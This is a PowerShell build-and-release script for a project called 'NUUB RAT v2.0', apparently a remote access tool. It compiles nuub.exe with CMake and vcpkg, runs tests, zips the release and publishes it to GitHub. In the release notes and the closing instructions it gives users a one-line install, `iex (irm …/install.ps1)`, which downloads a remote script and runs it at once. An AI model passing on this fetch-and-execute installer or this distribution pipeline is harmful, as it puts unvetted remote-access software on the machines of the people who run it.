# NUUB RAT v2.0 - Build & Release Script
# Compiles, tests, packages, and optionally uploads to GitHub Releases.
#
# Usage:
#   .\tools\build_release.ps1                          # Build + test + package
#   .\tools\build_release.ps1 -Version "2.0.1"        # Specific version
#   .\tools\build_release.ps1 -Publish                 # Build + publish to GitHub
#   .\tools\build_release.ps1 -Clean                   # Clean build directory first
#
# Prerequisites on the BUILD machine:
#   - Visual Studio 2022 (with C++ workload)
#   - CMake 3.25+
#   - vcpkg (with VCPKG_ROOT env var)
#   - gh CLI (only for -Publish)

param(
    [string]$Version = "2.0.0",
    [string]$VcpkgRoot = $env:VCPKG_ROOT,
    [string]$BuildType = "Release",
    [switch]$Publish,
    [switch]$Clean,
    [switch]$SkipTests
)

$ErrorActionPreference = "Stop"
$ProjectRoot = Split-Path -Parent $PSScriptRoot
$BuildDir = Join-Path $ProjectRoot "build"
$ReleaseDir = Join-Path $ProjectRoot "release"
$StagingDir = Join-Path $ReleaseDir "stage"

# ─── Helpers ─────────────────────────────────────────────────────────────────

function Write-Step {
    param([string]$Step, [string]$Title)
    Write-Host "`n$('=' * 60)" -ForegroundColor Cyan
    Write-Host "[$Step] $Title" -ForegroundColor Cyan
    Write-Host "$('=' * 60)" -ForegroundColor Cyan
}

function Write-OK { param([string]$Msg) Write-Host "[OK] $Msg" -ForegroundColor Green }
function Write-Err { param([string]$Msg) Write-Host "[ERROR] $Msg" -ForegroundColor Red }
function Write-Info { param([string]$Msg) Write-Host "[INFO] $Msg" -ForegroundColor DarkYellow }

function Invoke-OrDie {
    param([string]$Description, [scriptblock]$Command)
    Write-Info $Description
    & $Command
    if ($LASTEXITCODE -ne 0) {
        Write-Err "Failed: $Description (exit code: $LASTEXITCODE)"
        exit 1
    }
}

# ─── Banner ──────────────────────────────────────────────────────────────────

Write-Host ""
Write-Host ' _   _ _   _  ___ _____    ___  ___   _   _  _____' -ForegroundColor Cyan
Write-Host '| | | | \ | |/ _ \_   _|  / _ \|_ _| \ | |/ / _ \' -ForegroundColor Cyan
Write-Host '| | | |  \| | | | || |   | | | || ||  \| | | | |' -ForegroundColor Cyan
Write-Host '| |_| | |\  | |_| || |   | |_| || || |\  | |_| |' -ForegroundColor Cyan
Write-Host ' \___/|_| \_|\___/ |_|    \___/___|_| \_|\___/' -ForegroundColor Cyan
Write-Host ""
Write-Host "   Build & Release Script v2.0" -ForegroundColor Yellow
Write-Host "   Version: $Version" -ForegroundColor Yellow
Write-Host ""

# ─── Step 1: Verify Environment ─────────────────────────────────────────────

Write-Step "1/6" "Verifying Build Environment"

# VCPKG_ROOT - auto-detect if not set
if (-not $VcpkgRoot -or -not (Test-Path $VcpkgRoot)) {
    # Try common installation locations
    $candidates = @(
        $env:VCPKG_ROOT,
        "C:\vcpkg",
        "D:\vcpkg",
        "$env:USERPROFILE\vcpkg",
        "$env:USERPROFILE\Documents\vcpkg",
        "$env:LOCALAPPDATA\vcpkg"
    )
    $found = $candidates | Where-Object { $_ -and (Test-Path (Join-Path $_ "vcpkg.exe")) } | Select-Object -First 1
    if ($found) {
        $VcpkgRoot = $found
        Write-Info "Auto-detected VCPKG_ROOT: $VcpkgRoot"
    } else {
        Write-Err "vcpkg.exe not found. Set VCPKG_ROOT or install vcpkg."
        Write-Info "Install: git clone https://github.com/microsoft/vcpkg.git C:\vcpkg && C:\vcpkg\bootstrap-vcpkg.bat"
        exit 1
    }
}
Write-OK "VCPKG_ROOT: $VcpkgRoot"

# CMake
try {
    $cmakeVersion = (cmake --version 2>&1 | Select-Object -First 1) -replace 'cmake version ', ''
    Write-OK "CMake: $cmakeVersion"
} catch {
    Write-Err "CMake not found in PATH"
    exit 1
}

# vcpkg
$vcpkgExe = Join-Path $VcpkgRoot "vcpkg.exe"
if (-not (Test-Path $vcpkgExe)) {
    # Try vcpkg in PowerShell module path
    $vcpkgExe = "vcpkg"
}
Write-OK "vcpkg: $vcpkgExe"

# Visual Studio (check for cl.exe)
$vsWhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
if (Test-Path $vsWhere) {
    $vsPath = & $vsWhere -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2>$null
    if ($vsPath) {
        Write-OK "Visual Studio: $vsPath"
    } else {
        Write-Err "Visual Studio with C++ workload not found"
        exit 1
    }
} else {
    Write-Info "vswhere.exe not found, skipping VS detection (build may still work)"
}

# ─── Step 2: Clean (optional) ───────────────────────────────────────────────

if ($Clean) {
    Write-Step "2/6" "Cleaning Build Directory"
    if (Test-Path $BuildDir) {
        Remove-Item -Recurse -Force $BuildDir
        Write-OK "Build directory cleaned"
    }
    if (Test-Path $ReleaseDir) {
        Remove-Item -Recurse -Force $ReleaseDir
        Write-OK "Release directory cleaned"
    }
} else {
    Write-Step "2/6" "Skipping Clean (use -Clean to force)"
}

# ─── Step 3: Install Dependencies ───────────────────────────────────────────

Write-Step "3/6" "Installing Dependencies via vcpkg"

# Check if vcpkg.json exists
$vcpkgManifest = Join-Path $ProjectRoot "vcpkg.json"
if (-not (Test-Path $vcpkgManifest)) {
    Write-Err "vcpkg.json not found at $vcpkgManifest"
    exit 1
}

Invoke-OrDie "Running vcpkg install" {
    & $vcpkgExe install --triplet x64-windows
}

Write-OK "Dependencies installed"

# ─── Step 4: Configure CMake ─────────────────────────────────────────────────

Write-Step "4/6" "Configuring CMake"

$toolchainFile = Join-Path $VcpkgRoot "scripts\buildsystems\vcpkg.cmake"

Invoke-OrDie "Configuring CMake" {
    cmake -B $BuildDir -S $ProjectRoot `
        -DCMAKE_TOOLCHAIN_FILE=$toolchainFile `
        -DCMAKE_BUILD_TYPE=$BuildType `
        -DVCPKG_TARGET_TRIPLET=x64-windows
}

Write-OK "CMake configured"

# ─── Step 5: Build ───────────────────────────────────────────────────────────

Write-Step "5/6" "Building ($BuildType)"

Invoke-OrDie "Building project" {
    cmake --build $BuildDir --config $BuildType
}

# Verify output
$exePath = Join-Path $BuildDir "$BuildType\nuub.exe"
if (-not (Test-Path $exePath)) {
    Write-Err "nuub.exe not found at expected path: $exePath"
    # Try alternate path
    $exePath = Join-Path $BuildDir "nuub.exe"
    if (-not (Test-Path $exePath)) {
        Write-Err "nuub.exe not found anywhere in build directory"
        exit 1
    }
}

$size = (Get-Item $exePath).Length / 1MB
Write-OK "Build successful: nuub.exe ($([math]::Round($size, 2)) MB)"

# ─── Step 6: Tests ───────────────────────────────────────────────────────────

if (-not $SkipTests) {
    Write-Host "`n$('=' * 60)" -ForegroundColor Cyan
    Write-Host "[6/6] Running Tests" -ForegroundColor Cyan
    Write-Host "$('=' * 60)" -ForegroundColor Cyan

    try {
        Invoke-OrDie "Running test suite" {
            ctest --test-dir $BuildDir --build-config $BuildType --output-on-failure
        }
        Write-OK "All tests passed"
    } catch {
        Write-Err "Some tests failed. Review output above."
        Write-Info "Use -SkipTests to bypass testing"
        exit 1
    }
} else {
    Write-Step "6/6" "Skipping Tests (use -SkipTests to bypass)"
}

# ─── Package Release ─────────────────────────────────────────────────────────

Write-Host "`n$('=' * 60)" -ForegroundColor Cyan
Write-Host "[PACKAGE] Creating Release Package" -ForegroundColor Cyan
Write-Host "$('=' * 60)" -ForegroundColor Cyan

# Clean staging
if (Test-Path $StagingDir) {
    Remove-Item -Recurse -Force $StagingDir
}
New-Item -ItemType Directory -Path $StagingDir -Force | Out-Null

# Copy files
Copy-Item $exePath -Destination $StagingDir -Force
Copy-Item (Join-Path $ProjectRoot "config.example.json") -Destination $StagingDir -Force
Copy-Item (Join-Path $PSScriptRoot "install.ps1") -Destination $StagingDir -Force

# Create zip
$zipName = "nuub-v$Version.zip"
$zipPath = Join-Path $ReleaseDir $zipName

if (Test-Path $zipPath) {
    Remove-Item $zipPath -Force
}

Compress-Archive -Path "$StagingDir\*" -DestinationPath $zipPath -Force

$zipSize = (Get-Item $zipPath).Length / 1MB
Write-OK "Release package: $zipPath ($([math]::Round($zipSize, 2)) MB)"

# List contents
Write-Host "`nPackage contents:" -ForegroundColor Yellow
Get-ChildItem $StagingDir | ForEach-Object {
    Write-Host "  $($_.Name) ($([math]::Round($_.Length / 1KB, 1)) KB)"
}

# ─── Publish to GitHub (optional) ────────────────────────────────────────────

if ($Publish) {
    Write-Host "`n$('=' * 60)" -ForegroundColor Cyan
    Write-Host "[PUBLISH] Creating GitHub Release" -ForegroundColor Cyan
    Write-Host "$('=' * 60)" -ForegroundColor Cyan

    # Check gh CLI
    try {
        $ghVersion = gh --version 2>&1 | Select-Object -First 1
        Write-OK "GitHub CLI: $ghVersion"
    } catch {
        Write-Err "GitHub CLI (gh) not found. Install from: https://cli.github.com/"
        Write-Info "You can manually upload $zipPath to GitHub Releases"
        exit 1
    }

    # Check if logged in
    try {
        gh auth status 2>&1 | Out-Null
        Write-OK "GitHub CLI authenticated"
    } catch {
        Write-Err "GitHub CLI not authenticated. Run: gh auth login"
        exit 1
    }

    # Create release
    $tagName = "v$Version"
    $releaseName = "NUUB RAT v$Version"
    $releaseBody = @"
## NUUB RAT v$Version

### Quick Install (one line)
``````powershell
iex (irm https://github.com/AnderMC66/NUUB-VERSION-2/releases/latest/download/install.ps1)
``````

### Manual Install
1. Download ``nuub-v$Version.zip``
2. Extract to a folder
3. Run ``install.ps1`` or ``nuub.exe`` (auto-setup wizard)

### Changes
- See commit history for details
"@

    try {
        Invoke-OrDie "Creating GitHub release $tagName" {
            gh release create $tagName `
                --title $releaseName `
                --notes $releaseBody `
                --latest `
                $zipPath
        }
        Write-OK "GitHub release published: $tagName"
    } catch {
        Write-Err "Failed to create GitHub release"
        Write-Info "Upload manually: gh release create $tagName $zipPath --title `"$releaseName`""
    }
}

# ─── Done ────────────────────────────────────────────────────────────────────

Write-Host "`n$('=' * 60)" -ForegroundColor Green
Write-Host "BUILD COMPLETE" -ForegroundColor Green
Write-Host "$('=' * 60)" -ForegroundColor Green
Write-Host ""
Write-Host "  Binary:    $exePath"
Write-Host "  Package:   $zipPath"
Write-Host "  Version:   $Version"
Write-Host ""
Write-Host "Next steps:" -ForegroundColor Yellow
Write-Host "  1. Upload $zipName to GitHub Releases"
Write-Host "  2. Users install with:"
Write-Host '     iex (irm https://github.com/AnderMC66/NUUB-VERSION-2/releases/latest/download/install.ps1)' -ForegroundColor Cyan
Write-Host ""
